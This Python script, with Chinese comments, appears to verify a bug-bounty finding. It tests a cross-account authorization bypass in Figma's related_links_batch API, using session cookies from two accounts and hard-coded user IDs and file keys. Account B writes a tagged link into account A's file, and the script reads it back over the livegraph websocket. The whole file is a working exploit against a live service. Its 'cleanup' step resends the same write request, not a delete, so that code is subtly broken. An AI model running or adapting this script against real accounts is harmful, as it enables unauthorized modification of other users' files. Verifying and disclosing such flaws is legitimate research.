# -*- coding: utf-8 -*-
"""related_links_batch 越权写最终验证: WS DeveloperRelatedLinks view 读回
1. 纯净 B batch 写独特 tag -> 200?
2. WS(纯净 A cookie) 订阅 DeveloperRelatedLinks(A文件) -> 数据中是否有 B 的 link?
   有 -> 跨账号越权写坐实 (HIGH)
"""
import sys, json, io, uuid, asyncio, urllib.parse, urllib.request, urllib.error
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
import websockets

BASE = "https://www.figma.com"
A_UID = "1666382703778278399"
B_UID = "1667396392129259941"
A_DESIGN = "5Gs4PaTz11Hlk2sqVnidBG"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
HDR = {"User-Agent": UA, "Accept": "application/json", "Content-Type": "application/json", "Origin": BASE, "Referer": BASE + "/"}


def clean_json_cookie_field(raw_value, keep_uid):
    v = urllib.parse.unquote(raw_value)
    try:
        d = json.loads(v)
    except Exception:
        return None
    if not isinstance(d, dict):
        return None
    nd = {k: val for k, val in d.items() if k == keep_uid}
    if not nd:
        return None
    return urllib.parse.quote(json.dumps(nd, separators=(",", ":")))


def make_abs_pure(cookie, keep_uid):
    parts = {}
    for p in cookie.split("; "):
        if "=" in p:
            k, v = p.split("=", 1)
            parts[k] = v
    authn_raw = parts.get("__Host-figma.authn", "")
    d = json.loads(urllib.parse.unquote(authn_raw))
    d = {k: v for k, v in d.items() if k == keep_uid}
    parts["__Host-figma.authn"] = urllib.parse.quote(json.dumps(d, separators=(",", ":")))
    if "__Host-figma.embed" in parts:
        ne = clean_json_cookie_field(parts["__Host-figma.embed"], keep_uid)
        if ne:
            parts["__Host-figma.embed"] = ne
        else:
            del parts["__Host-figma.embed"]
            parts.pop("__Host-figma.embed.mac", None)
    return "; ".join(f"{k}={v}" for k, v in parts.items())


rawB = io.open("ws_cookie_B_new.txt", encoding="utf-8").read().strip().replace("\n", "; ")
rawA = io.open("ws_cookie_A_new.txt", encoding="utf-8").read().strip().replace("\n", "; ")
ABS_A = make_abs_pure(rawA, A_UID)
ABS_B = make_abs_pure(rawB, B_UID)

TAG = f"h1-vrf-{uuid.uuid4().hex[:8]}"


def batch_post(cookie, fk, tag, label):
    body = {"link_batch": [{"node_id": "0:1", "file_key": fk,
                            "link_name": tag, "link_url": "https://example.com/h1-vrf"}]}
    h = {**HDR, "Cookie": cookie}
    r = urllib.request.Request(BASE + "/api/files/related_links_batch",
                               data=json.dumps(body).encode(), headers=h, method="POST")
    try:
        with urllib.request.urlopen(r, timeout=25) as resp:
            print(f"[{label}] HTTP {resp.status} {resp.read().decode(errors='replace')[:200]}")
            return resp.status
    except urllib.error.HTTPError as e:
        print(f"[{label}] HTTP {e.code} {e.read().decode(errors='replace')[:200]}")
        return e.code


def lg_url(fk, uid):
    return (f"wss://www.figma.com/api/livegraph?pv=1&pr=251c5be83e6853e5&pt=1786072093"
            f"&ph=sb9dUg8LQV0WGY29b-j8nggmhGX8TR2vghWs-rNzbds&userId={uid}&anonUserId="
            f"&clientType=web&commitHash=5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"
            f"&preload=%7B%7D&requestedProtocolVersion=2"
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2F{fk}"
            f"&connectionType=initial&reconnect=0")


async def ws_read_links(cookie, uid, fk, tag):
    """订阅 DeveloperRelatedLinks, 返回找到的 link 列表"""
    found = []
    try:
        async with websockets.connect(lg_url(fk, uid),
                                      additional_headers={"User-Agent": UA, "Cookie": cookie,
                                                          "Origin": BASE},
                                      max_size=50_000_000, open_timeout=15) as ws:
            await ws.send(json.dumps({"messageType": "auth", "clientType": "web",
                                      "args": {"userId": uid, "anonymousUserId": None},
                                      "tags": {"clientType": "web",
                                               "commitHash": "81855c2bc7c604648169c4e4333f43579bfa7464",
                                               "clientUrl": f"https://www.figma.com/file/{fk}"},
                                      "clientRequestedVersion": 2}))
            for _ in range(3):
                m = await asyncio.wait_for(ws.recv(), timeout=8)
                if isinstance(m, str) and "authSuccess" in m:
                    break
            await ws.send(json.dumps({"messageType": "subscribe", "viewName": "DeveloperRelatedLinks",
                                      "viewHash": "f" * 32, "loadType": "initial",
                                      "args": {"fileKey": fk}}))
            import time
            deadline = time.time() + 15
            while time.time() < deadline:
                try:
                    m = await asyncio.wait_for(ws.recv(), timeout=3)
                except asyncio.TimeoutError:
                    break
                if not isinstance(m, str):
                    continue
                if "viewLoaded" in m or "initial" in m or "update" in m.lower():
                    # 收集所有含 linkName 的对象
                    try:
                        j = json.loads(m)
                        s = json.dumps(j, ensure_ascii=False)
                        if "developerRelatedLinks" in s or "linkName" in s:
                            print(f"  🖼 帧: {s[:1500]}")
                            if "linkName" in s:
                                found.append(s)
                    except Exception:
                        pass
    except Exception as e:
        print(f"[ws_read_links] ❌ {type(e).__name__}: {str(e)[:100]}")
    return found


async def main():
    print(f"验证 tag: {TAG}\n")
    print("=" * 70)
    print("1. 纯净 B batch 写 A 文件 (独特 tag)")
    batch_post(ABS_B, A_DESIGN, TAG, "纯净B写")

    print("\n2. WS 纯净A 订阅 DeveloperRelatedLinks 读回")
    found = await ws_read_links(ABS_A, A_UID, A_DESIGN, TAG)
    all_text = " ".join(found)
    print(f"\n[结果] 帧中含 linkName 的: {len(found)}")
    if TAG in all_text:
        print("🚨🚨🚨 坐实: B 写入的 link 出现在 A 文件 related_links 中 = 跨账号越权写!")
    else:
        print("未见 B 的 tag -> 写入未生效 (batch 静默丢弃?)")

    print("\n3. 对照: WS 纯净B 订阅 A 文件 (B 能否读到 A 文件 related_links?)")
    foundB = await ws_read_links(ABS_B, B_UID, A_DESIGN, TAG)
    print(f"[结果B] 帧数: {len(foundB)}")

    print("\n4. 清理: 纯净B 删除自己的 link")
    batch_post(ABS_B, A_DESIGN, TAG, "纯净B删")
    # 用 A 的视角确认清理
    foundA2 = await ws_read_links(ABS_A, A_UID, A_DESIGN, TAG)
    if TAG in " ".join(foundA2):
        print("⚠️ tag 仍在, 需手动清理")
    else:
        print("✅ tag 已清除 (或从未写入)")


asyncio.run(main())
